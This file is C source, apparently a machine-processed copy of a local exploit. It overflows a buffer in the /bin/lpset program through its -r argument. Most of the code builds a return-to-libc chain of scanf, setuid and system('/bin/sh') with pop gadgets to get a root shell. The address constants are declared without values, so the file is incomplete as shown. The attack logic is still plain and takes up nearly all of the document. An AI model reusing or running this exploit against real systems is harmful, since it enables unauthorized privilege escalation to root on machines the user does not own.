#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  BINSH ; 
 int BUFSIZE ; 
 int /*<<< orphan*/  PERCD ; 
 int /*<<< orphan*/  POP1 ; 
 int /*<<< orphan*/  POP2 ; 
 int SCANF ; 
 int /*<<< orphan*/  SETUID ; 
 int STACK ; 
 int /*<<< orphan*/  SYSTEM ; 
 int /*<<< orphan*/  execle (char*,char*,char*,char*,char*,unsigned char*,char*,int /*<<< orphan*/ ,char**) ; 
 int /*<<< orphan*/  memset (unsigned char*,char,int) ; 

int
main()
{     
    unsigned char expbuf[1024];
    char *env[1]; 
    int *p, i;    
    
    memset(expbuf, 'a', BUFSIZE);
    p = (int *)(expbuf + BUFSIZE);
    
    *p++ = STACK;
    *p++ = SCANF + 1;
    *p++ = STACK + 6 * 4;
    *p++ = POP2; 
    *p++ = PERCD;
    *p++ = STACK + 9 * 4;
    
    *p++ = STACK + 10 * 4;
    *p++ = SETUID; 
    *p++ = POP1;   
    *p++ = 0x33333333;
    *p++ = STACK + 15 * 4;
    
    *p++ = SYSTEM;
    *p++ = 0x33333333;
    *p++ = BINSH;     
    *p = 0;
    
    env[0] = 0;
    execle("/bin/lpset", "/bin/lpset", "-n", "fns", "-r", expbuf, "123", 0,
           env);       
    return 0;
}